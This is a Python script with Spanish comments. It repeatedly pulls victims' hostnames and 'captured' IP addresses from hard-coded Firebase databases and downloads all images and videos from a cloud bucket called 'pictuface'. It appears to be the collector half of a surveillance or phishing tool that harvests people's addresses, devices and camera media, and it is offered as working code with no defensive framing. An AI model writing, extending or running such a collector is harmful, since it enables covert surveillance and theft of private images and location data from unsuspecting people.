import requests
from google.cloud import storage
from time import sleep
import os
import platform

# Lista de extensiones de archivo permitidas
allowed_extensions = ['.png', '.jpg', '.mp4']

# Obtener nombres de host y mostrarlos sin repetir


def get_hostnames():
    os.system('cls' if os.name == 'nt' else 'clear')
    hostname_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/export.json'
    hostname_response = requests.get(hostname_url)
    hostname_data = hostname_response.json()

    hostnames = list(set(hostname_data.values()))
    print("""
              HostName""")
    for hostname in hostnames:
        print(f'''
              ----------
              {hostname}
              ---------- ''')

# Obtener y mostrar todos los datos de la base de datos de IPs


def get_all_ips():
    ip_url = 'https://data-fe2c3-default-rtdb.firebaseio.com/ip.json'
    ip_response = requests.get(ip_url)
    ip_data = ip_response.json()

    print("""\n
     ============
    |Ip Capturin|
    ============\n""")
    with open('ip_data.txt', 'w') as file:
        for data in ip_data.values():
            if isinstance(data, list):
                formatted_data = ','.join(data)
                formatted_data = formatted_data.replace(',', '\n=>  ')
            else:
                formatted_data = data
            file.write(str(formatted_data) + '\n')

    # Leer y mostrar los datos del archivo de texto según el sistema operativo
    if platform.system() == 'Windows':
        os.system("type ip_data.txt | findstr /v /c:\",")
    else:
        os.system("cat ip_data.txt | grep -v ','")

# Obtener nombres de archivos y mostrarlos sin repetir


def get_file_names():
    client = storage.Client.from_service_account_json(
        'services/serviceAccounts.json')
    bucket_name = 'pictuface-f9763.appspot.com'
    bucket = client.get_bucket(bucket_name)

    blobs = bucket.list_blobs(prefix='', delimiter='/')
    file_names = [blob.name for blob in blobs if any(
        blob.name.endswith(ext) for ext in allowed_extensions)]
    file_names = list(set(file_names))

    print("""\n
     ==============
    |Data Extract:|
    ==============\n""")
    for file_name in file_names:
        print('=> ' + file_name)
        download_path = f'imgdata/{file_name}'
        os.makedirs(os.path.dirname(download_path), exist_ok=True)
        blob = bucket.blob(file_name)
        blob.download_to_filename(download_path)
        print(f"EXTRACT Complete...")


# Bucle principal para obtener datos en tiempo real
while True:
    get_hostnames()
    get_all_ips()
    get_file_names()

    # Esperar 10 segundos antes de la siguiente iteración
    sleep(17)
